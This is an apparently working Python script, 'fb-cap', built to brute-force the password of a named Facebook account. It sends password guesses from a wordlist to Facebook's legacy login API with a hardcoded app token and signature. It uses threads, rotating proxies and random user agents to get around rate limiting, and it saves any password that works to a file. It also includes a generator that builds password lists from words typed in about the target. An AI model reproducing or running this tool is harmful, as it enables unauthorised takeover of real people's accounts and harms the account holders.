#! /usr/bin/env python3
import requests
import time,os,sys 
import user_agent 
import random
from pystyle import Colors as color 
from rgbprint import gradient_print 
from argparse import ArgumentParser
from threading import Thread
import urllib3
import warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
error=color.red+'[!] '
great=color.green+'[+] '+color.yellow
info =color.cyan+'[*] '+color.purple 
def help_():
    vhelp=f"""
**fb-cap** help 
-h , --help : show this help message and exit
-t , --target : **victem** username/id/email/phone-number
-w , --wordlist : **wordList** passwords for attacks 
-gp , --genpass : Generate Password List **Good-List** script
-ut , --usethread : use threades for **attacks**
-up , --useproxy : **proxy** wordlist for attacks 

"""
    print(vhelp)
def args():
    parse=ArgumentParser(add_help=False)
    parse.add_argument('-t','--target')
    parse.add_argument('-w','--wordlist')
    parse.add_argument('-gp','--genpass',action='store_true')
    parse.add_argument('-ut','--usethread',action='store_true')
    parse.add_argument('-up','--useproxy')
    parse.add_argument('-h','--help',action='store_true')
    return parse.parse_args()
def bannerr():
    banner_="""
    ____    __                                             
   / __/   / /_          _____  ____ _    ____           
  / /_    / __ \ ______ / ___/ / __ `/   / __ \      
 / __/   / /_/ //_____// /__  / /_/ /   / /_/ /         
/_/     /_.___/        \___/  \__,_/   / .___/             
                                      /_/                       
 [*] code by @issamiso  **rider**

    """
    gradient_print(banner_,start_color="red",end_color="blue")
def goodlist():
    os.system('printf "\033[3;32m" ') 
    aaa=input('Entre name The LisT : ')
    os.system('printf "\033[3;36m"') 
    print('-'*29)
    file=open(aaa,'w') 
    aa=set([]) 
    oio=set([])
    #iio=set([112233,332211,000,445566,'$'*1,'$'*2,'$'*3,'@'*1,'@'*2,'@'*3,'€'*1,'€'*2,'€'*3,'&'*1,'&'*2,'&'*3,'¥'*1,'¥'*2,'¥'*3,'*'*1,'*'*2,'*'*3,'+'*1,'+'*2,'+'*3])
    kk=1
    while True :
        b=input('Entre {} : '.format(kk))
        if b=='exit' :
            print('\033[3;36m')
            file.close()
            qq=open(aaa, 'r' )
            ll=len(qq.readlines())
            os.system('printf "\033[3;31m"')
            print('-'*60)
            print('>> {} Passwords in ---> {} '.format(ll, aaa))
            print('-'*60) 
            break ;
        aa.add(b)
        for i in aa:
            if len(i) >= 9 and i not in oio :
                oio.add(i)
                file.write(i)
                file.write('\n')
                #for o in iio:
                #   uau='{}{}'.format(i,o) 
                #  ubu='{}{}{}'.format(o,i,o)
                # ucu='{}{}{} '.format(i,o,i)
                    #if len(uau)>= 6:
                    # file.write(uau)
                    #  file.write('\n')
                # if len(ubu) >= 6 and ubu != uau :
                    # file.write(ubu)
                    # file.write('\n')
                    #if len(ucu) >= 6 and ucu != uau and ucu != ubu:
                    #  file.write(ucu)
                    #  file.write('\n')

            c=b+i
            d=i+b
            if len(c) >= 9 :
                file.write(c)
                file.write('\n') 
            if c != d and len(d) >= 9:
                file.write(d)
                file.write('\n')
        kk=int(kk)+1
        print('-'*40)
def fb_api(username,password,prox={}):
    api_url = 'https://b-api.facebook.com/method/auth.login'
    data = {
        'access_token':'350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format':'JSON',
        'sdk_version':'2',
        'email': username,
        'locale':'en_US',
        'password': password,
        'sdk':'ios',
        'generate_session_cookies':'1',
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6',
    }
    headers = {
        'User-Agent':user_agent.generate_user_agent()
    }
    response = requests.post(
        url=api_url,
        data=data,
        headers=headers,
        proxies=prox,
        verify=False
    )
    js = response.json()
    try:
        token=js['access_token']
        print(great+"*target: "+color.white+username+color.green+" *password: "+color.white+password)
        with open(username,'w') as f:
            f.write(f'target: {username}\npassword: {password}')
        exit() 
    except:
        print(error+f'*target({username}) incorrect *password: '+color.white+password)
def check_dir(file):
    if os.path.exists(file):
        with open(file,'r') as f:
            for i in f.readlines():
                yield i
    else:
        sys.exit(error+f"path '{file}' is not found")
def opt():
    proxy_list=[]
    arg=args()
    target=arg.target
    wordlist=arg.wordlist 
    useth=arg.usethread
    genpass=arg.genpass
    if arg.useproxy:
        f=check_dir(arg.useproxy)
        for i in f:
            i=i.strip()
            if i != '':
                proxy_list.append(i)
    if genpass:
        bannerr()
        goodlist()
        sys.exit()
    if arg.help:
        bannerr()
        help_()
        sys.exit()
    if target and wordlist:
        f=check_dir(wordlist)
        bannerr()
        prox={}
        for p in f:
            p=p.strip()
            
            if proxy_list:
                ch=random.choice(proxy_list)
                prox['http']='http://'+ch 
                prox['https']='https://'+ch
            try:
                if useth:
                    th=Thread(target=fb_api,args=(target,p,prox))
                    th.start()
                else:
                    fb_api(target,p,prox)
            except KeyboardInterrupt:
                sys.exit(color.red+'Interrupt')
            except Exception as e:
                print(error+'**exception** '+color.white+str(e))
    else:
        sys.exit(error+'use python3 fb-cap.py --help')
opt()